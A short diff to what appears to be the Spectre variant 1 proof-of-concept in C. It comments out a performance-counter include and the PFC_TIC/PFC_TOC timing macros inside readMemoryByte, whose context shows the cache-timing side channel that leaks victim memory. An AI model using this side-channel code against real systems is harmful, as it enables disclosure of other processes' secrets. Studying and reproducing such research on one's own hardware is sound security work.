@@ -18,7 +18,7 @@
 #define sscanf_s sscanf
 #endif
 
-#include "pfc.h"
+// #include "pfc.h"
 
 /********************************************************************
 Victim code.
@@ -381,7 +381,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		PFC_TIC
+		// PFC_TIC
 		for (i = 0; i < 256; i++)
 		{
 			mix_i = ((i * 167) + 13) & 255;
@@ -392,7 +392,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
-		PFC_TOC
+		// PFC_TOC
 
 		/* Locate highest & second-highest results results tallies in j/k */
 		j = k = -1;
